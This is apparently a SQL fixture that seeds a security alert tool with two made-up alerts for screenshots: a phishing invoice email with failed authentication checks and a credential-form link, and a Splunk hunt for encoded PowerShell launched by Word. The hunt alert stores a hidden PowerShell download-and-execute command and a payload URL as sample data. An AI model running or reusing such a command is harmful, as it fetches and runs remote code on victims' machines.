-- tools/help-screenshots: two alerts whose page has a summary of its own, chosen by the alert's type
-- (crates/ace-gui/src/analysis/summary.rs): a mailbox alert, as the mailbox module leaves one, with the
-- email's details merged into its origin, and a hunt alert, as the hunter submits one, with its query
-- and the event it matched. Made up, like the rest of the fixture: the people, hosts, addresses and
-- the hunt are examples.

\set ON_ERROR_STOP on
BEGIN;

DO $$
DECLARE
    v_mail uuid := 'a1e47700-0000-4000-8000-000000000000';
    v_hunt uuid := 'a1e47710-0000-4000-8000-000000000000';
    v_at timestamptz := date_trunc('minute', now()) - interval '3 hours';
    v_email jsonb;
    o_email bigint; o_body bigint; o_attachment bigint; o_url bigint; o_sender bigint; o_fqdn bigint;
    o_ip bigint; o_signature bigint; o_host bigint; o_command bigint; o_user bigint;
    r_email bigint; r_url bigint; r_host bigint;
    v_action bigint;
BEGIN
    v_email := jsonb_build_object(
        'headers', jsonb_build_array(
            jsonb_build_array('Received', 'from mail.invoices-example.net (203.0.113.45) by mx1.corp.example.com'),
            jsonb_build_array('From', '"Accounts Payable" <billing@invoices-example.net>'),
            jsonb_build_array('To', 'pat@corp.example.com, sam@corp.example.com'),
            jsonb_build_array('Reply-To', 'payments@invoices-example.net'),
            jsonb_build_array('Subject', 'Overdue invoice INV-20418: payment required today'),
            jsonb_build_array('Date', to_char(v_at - interval '4 minutes', 'Dy, DD Mon YYYY HH24:MI:SS "+0000"')),
            jsonb_build_array('Message-ID', '<20418.7731@invoices-example.net>'),
            jsonb_build_array('X-Originating-IP', '[203.0.113.45]')),
        'from', '"Accounts Payable" <billing@invoices-example.net>',
        'from_address', 'billing@invoices-example.net',
        'env_rcpt_to', jsonb_build_array('pat@corp.example.com', 'sam@corp.example.com'),
        'env_mail_from', 'bounce@invoices-example.net',
        'to', jsonb_build_array('pat@corp.example.com', 'sam@corp.example.com'),
        'to_addresses', jsonb_build_array('pat@corp.example.com', 'sam@corp.example.com'),
        'subject', 'Overdue invoice INV-20418: payment required today',
        'decoded_subject', 'Overdue invoice INV-20418: payment required today',
        'message-id', '<20418.7731@invoices-example.net>',
        'reply_to', 'payments@invoices-example.net',
        'reply_to_address', 'payments@invoices-example.net',
        'originating_ip', '203.0.113.45',
        'first_hop_ip', '203.0.113.45',
        'first_hop_helo', 'mail.invoices-example.net',
        'spf_result', 'softfail', 'dkim_result', 'none', 'dmarc_result', 'fail',
        'compauth_result', 'fail', 'compauth_reason', '000',
        'is_anonymous_direct_send', false, 'internal_org_sender', false,
        'message_directionality', 'Incoming', 'authentication_failed', true,
        'mail_from_is_local', false, 'spoofed_internal', false,
        'log_entry', jsonb_build_object(
            'date', to_char(v_at, 'YYYY-MM-DD HH24:MI:SS.US "+0000"'),
            'first_received', NULL, 'last_received', NULL,
            'env_mail_from', 'bounce@invoices-example.net',
            'env_rcpt_to', jsonb_build_array('pat@corp.example.com', 'sam@corp.example.com'),
            'mail_from', 'billing@invoices-example.net',
            'mail_to', jsonb_build_array('pat@corp.example.com', 'sam@corp.example.com'),
            'reply_to', 'payments@invoices-example.net', 'cc', '[]'::jsonb, 'bcc', '[]'::jsonb,
            'message_id', '<20418.7731@invoices-example.net>', 'in_reply_to', NULL,
            'subject', 'Overdue invoice INV-20418: payment required today',
            'subject_raw', 'Overdue invoice INV-20418: payment required today',
            'path', jsonb_build_array('203.0.113.45'), 'size', 48211,
            'user_agent', NULL, 'x_mailer', NULL, 'originating_ip', '203.0.113.45',
            'headers', '[]'::jsonb,
            'attachment_count', 1, 'attachment_sizes', jsonb_build_array(31877),
            'attachment_types', jsonb_build_array('text/html'),
            'attachment_names', jsonb_build_array('INV-20418.html'),
            'attachment_hashes', jsonb_build_array(repeat('c1', 32)),
            'thread_topic', NULL, 'thread_index', NULL, 'refereneces', NULL, 'x_sender', NULL,
            'spf_result', 'softfail', 'dkim_result', 'none', 'dmarc_result', 'fail',
            'compauth_result', 'fail', 'compauth_reason', '000',
            'is_anonymous_direct_send', false, 'internal_org_sender', false,
            'message_directionality', 'Incoming', 'authentication_failed', true,
            'mail_from_is_local', false, 'spoofed_internal', false));

    -- the mailbox alert: the reported message, what its analysis added, and two delivered copies
    INSERT INTO analysis.roots
        (id, analysis_mode, description, event_time, event_time_source, created_at, alerted_at, pass,
         completed_pass, submitted_by, origin)
    VALUES (v_mail, 'correlation', 'ACE Mailbox Scanner Detection - Overdue invoice INV-20418: payment required today',
            v_at - interval '4 minutes', 'event', v_at, v_at, 1, 1,
            '{"kind": "internal", "id": "mailbox"}',
            jsonb_build_object('alert_type', 'mailbox', 'tool', 'ACE - Mailbox Scanner',
                               'tool_instance', 'mx1.corp.example.com',
                               'details', jsonb_build_object('email', v_email)));
    INSERT INTO analysis.observables (root_id, type, value, directives, created_at)
    VALUES (v_mail, 'file', repeat('a7', 32), '{original_email,archive}', v_at) RETURNING id INTO o_email;
    INSERT INTO analysis.files (root_id, observable_id, path, analyzed, created_at)
    VALUES (v_mail, o_email, 'email.rfc822', true, v_at);
    INSERT INTO analysis.results (root_id, observable_id, module, analysis_type, schema_version, details, summary, created_at)
    VALUES (v_mail, o_email, 'email_analyzer', 'email_analysis', 1,
            jsonb_build_object('parsing_error', NULL, 'extraction_errors', '[]'::jsonb, 'email', v_email),
            'Email Analysis - Overdue invoice INV-20418: payment required today', v_at + interval '2 seconds')
    RETURNING id INTO r_email;

    INSERT INTO analysis.observables (root_id, type, value, created_at)
    VALUES (v_mail, 'file', repeat('b0', 32), v_at + interval '2 seconds') RETURNING id INTO o_body;
    INSERT INTO analysis.files (root_id, observable_id, path, analyzed, depth, created_at)
    VALUES (v_mail, o_body, 'email.rfc822.unknown_text_html_000.html', true, 1, v_at + interval '2 seconds');
    INSERT INTO analysis.observables (root_id, type, value, created_at)
    VALUES (v_mail, 'file', repeat('c1', 32), v_at + interval '2 seconds') RETURNING id INTO o_attachment;
    INSERT INTO analysis.files (root_id, observable_id, path, analyzed, depth, created_at)
    VALUES (v_mail, o_attachment, 'INV-20418.html', true, 1, v_at + interval '2 seconds');
    INSERT INTO analysis.observables (root_id, type, value, created_at)
    VALUES (v_mail, 'email_address', 'billing@invoices-example.net', v_at + interval '2 seconds')
    RETURNING id INTO o_sender;
    INSERT INTO analysis.observables (root_id, type, value, tags, created_at)
    VALUES (v_mail, 'url', 'https://pay.invoices-example.net/session/INV-20418?u=pat', '{credential_form}',
            v_at + interval '3 seconds')
    RETURNING id INTO o_url;
    INSERT INTO analysis.observables (root_id, type, value, created_at)
    VALUES (v_mail, 'fqdn', 'pay.invoices-example.net', v_at + interval '4 seconds') RETURNING id INTO o_fqdn;
    INSERT INTO analysis.observables (root_id, type, value, created_at)
    VALUES (v_mail, 'ipv4', '203.0.113.45', v_at + interval '4 seconds') RETURNING id INTO o_ip;
    INSERT INTO analysis.result_additions (root_id, result_id, observable_id)
    VALUES (v_mail, r_email, o_body), (v_mail, r_email, o_attachment), (v_mail, r_email, o_sender);
    INSERT INTO analysis.observables (root_id, type, value, created_at)
    VALUES (v_mail, 'message_id', '<20418.7731@invoices-example.net>', v_at + interval '2 seconds'),
           (v_mail, 'email_delivery', '<20418.7731@invoices-example.net>|pat@corp.example.com', v_at + interval '2 seconds'),
           (v_mail, 'email_delivery', '<20418.7731@invoices-example.net>|sam@corp.example.com', v_at + interval '2 seconds');
    INSERT INTO analysis.result_additions (root_id, result_id, observable_id)
    SELECT v_mail, r_email, id FROM analysis.observables
    WHERE root_id = v_mail AND type IN ('message_id', 'email_delivery') ORDER BY id;

    -- the attachment holds the link, and the link's host and where it resolves
    INSERT INTO analysis.results (root_id, observable_id, module, analysis_type, schema_version, details, summary, created_at)
    VALUES (v_mail, o_attachment, 'url_extraction', 'url_extraction_analysis', 1, '{}',
            'URL Extraction: 1 URL', v_at + interval '3 seconds')
    RETURNING id INTO r_url;
    INSERT INTO analysis.result_additions (root_id, result_id, observable_id) VALUES (v_mail, r_url, o_url);
    INSERT INTO analysis.results (root_id, observable_id, module, analysis_type, schema_version, details, summary, created_at)
    VALUES (v_mail, o_url, 'parse_url', 'parse_url_analysis', 1, '{}', 'Parsed URL', v_at + interval '4 seconds')
    RETURNING id INTO r_host;
    INSERT INTO analysis.result_additions (root_id, result_id, observable_id)
    VALUES (v_mail, r_host, o_fqdn), (v_mail, r_host, o_ip);
    INSERT INTO analysis.results (root_id, observable_id, module, analysis_type, schema_version, details, summary, created_at)
    VALUES (v_mail, o_body, 'file_type', 'file_type_analysis', 1, '{}', 'File Type: HTML document', v_at + interval '3 seconds'),
           (v_mail, o_sender, 'email_address_fqdn', 'email_address_fqdn_analysis', 1, '{}', 'Sender domain invoices-example.net', v_at + interval '3 seconds');

    INSERT INTO analysis.detections
        (root_id, observable_id, description, signature_uuid, signature_version, signature_family, created_at)
    VALUES (v_mail, o_attachment, 'HTML_Credential_Form_Posts_Offsite matched', '9a110000-0000-4000-8000-000000000001',
            'feedface00feedface00feedface00feedface00', 'yara', v_at + interval '3 seconds'),
           (v_mail, o_url, 'URL_Invoice_Lure_Session_Path matched', '9a110000-0000-4000-8000-000000000002',
            'feedface00feedface00feedface00feedface00', 'yara', v_at + interval '4 seconds');

    -- pat's copy was removed; sam's is still in the mailbox
    INSERT INTO queue.actions
        (kind, handler, observable_type, observable_value, status, result, result_message, action, attempts, created_at, updated_at)
    VALUES ('remediation', 'email', 'email_delivery', '<20418.7731@invoices-example.net>|pat@corp.example.com',
            'COMPLETED', 'SUCCESS', 'removed', 'remove', 1, v_at + interval '20 minutes', v_at + interval '21 minutes')
    RETURNING id INTO v_action;
    INSERT INTO queue.action_roots (action_id, root_id) VALUES (v_action, v_mail);

    -- the hunt alert: what the hunter submits for one matched event
    INSERT INTO analysis.roots
        (id, analysis_mode, description, event_time, event_time_source, created_at, alerted_at, pass,
         completed_pass, submitted_by, origin)
    VALUES (v_hunt, 'correlation', 'Encoded PowerShell from an Office application: fin-ws-017',
            v_at - interval '9 minutes', 'event', v_at + interval '30 minutes', v_at + interval '30 minutes', 1, 1,
            '{"kind": "internal", "id": "hunter"}',
            jsonb_build_object(
                'alert_type', 'hunter - splunk - endpoint',
                'description', 'Encoded PowerShell from an Office application',
                'instructions', 'An Office application started PowerShell with an encoded command. Decode the command, and check whether the document came by email or from the web.',
                'analysis_mode', 'correlation', 'queue', 'default',
                'tool', 'hunter-splunk', 'tool_instance', 'splunk.corp.example.com',
                'event_time', to_char(v_at - interval '9 minutes', 'YYYY-MM-DD"T"HH24:MI:SS"+00:00"'),
                'event_time_source', 'event',
                'extensions', jsonb_build_object('playbook_url', 'https://wiki.corp.example.com/playbooks/office-spawns-powershell'),
                'details', jsonb_build_object(
                    'search_id', '1763200000.4471',
                    'search_link', 'https://splunk.corp.example.com/en-US/app/search/search?sid=1763200000.4471',
                    'query', 'search index=endpoint sourcetype=process_creation earliest='
                             || to_char(v_at - interval '20 minutes', 'MM/DD/YYYY:HH24:MI:SS') || ' latest='
                             || to_char(v_at - interval '5 minutes', 'MM/DD/YYYY:HH24:MI:SS')
                             || ' parent_process_name IN (winword.exe, excel.exe) process_name=powershell.exe command_line="*-enc*" | stats count min(_time) as first_seen values(command_line) as command_line by host user parent_process_name | where count > 0',
                    'events', jsonb_build_array(jsonb_build_object(
                        '_time', to_char(v_at - interval '9 minutes', 'YYYY-MM-DD"T"HH24:MI:SS"+00:00"'),
                        'host', 'fin-ws-017.corp.example.com', 'user', 'CORP\jordan',
                        'parent_process_name', 'winword.exe', 'process_name', 'powershell.exe',
                        'command_line', 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA',
                        'count', '1', 'src_ip', '10.20.14.117', 'sourcetype', 'process_creation',
                        'index', 'endpoint')))));
    INSERT INTO analysis.observables (root_id, type, value, created_at)
    VALUES (v_hunt, 'hostname', 'fin-ws-017.corp.example.com', v_at + interval '30 minutes') RETURNING id INTO o_host;
    INSERT INTO analysis.observables (root_id, type, value, created_at)
    VALUES (v_hunt, 'user', 'jordan', v_at + interval '30 minutes') RETURNING id INTO o_user;
    INSERT INTO analysis.observables (root_id, type, value, created_at)
    VALUES (v_hunt, 'command_line', 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA',
            v_at + interval '30 minutes')
    RETURNING id INTO o_command;
    INSERT INTO analysis.observables (root_id, type, value, display_type, created_at)
    VALUES (v_hunt, 'ipv4', '10.20.14.117', 'Source IP', v_at + interval '30 minutes');
    INSERT INTO analysis.observables (root_id, type, value, created_at)
    VALUES (v_hunt, 'signature_id', '5160a000-0000-4000-8000-0000000000f1', v_at + interval '30 minutes')
    RETURNING id INTO o_signature;
    INSERT INTO analysis.detections
        (root_id, observable_id, description, signature_uuid, signature_version, signature_family, created_at)
    VALUES (v_hunt, o_signature, 'hunt Encoded PowerShell from an Office application (splunk) matched',
            '5160a000-0000-4000-8000-0000000000f1', 'feedface00feedface00feedface00feedface00', 'hunt',
            v_at + interval '30 minutes');
    -- what analysis added under the host and the command
    INSERT INTO analysis.results (root_id, observable_id, module, analysis_type, schema_version, details, summary, created_at)
    VALUES (v_hunt, o_command, 'command_line_analyzer', 'command_line_analysis', 1, '{}',
            'Command Line Analysis: 1 encoded command', v_at + interval '31 minutes')
    RETURNING id INTO r_url;
    INSERT INTO analysis.observables (root_id, type, value, created_at)
    VALUES (v_hunt, 'url', 'http://198.51.100.24/a.ps1', v_at + interval '31 minutes') RETURNING id INTO o_url;
    INSERT INTO analysis.result_additions (root_id, result_id, observable_id) VALUES (v_hunt, r_url, o_url);
    INSERT INTO analysis.results (root_id, observable_id, module, analysis_type, schema_version, details, summary, created_at)
    VALUES (v_hunt, o_user, 'user_analyzer', 'user_analysis', 1, '{}', 'User Analysis: Jordan Reyes, Finance',
            v_at + interval '31 minutes');
END
$$;

COMMIT;
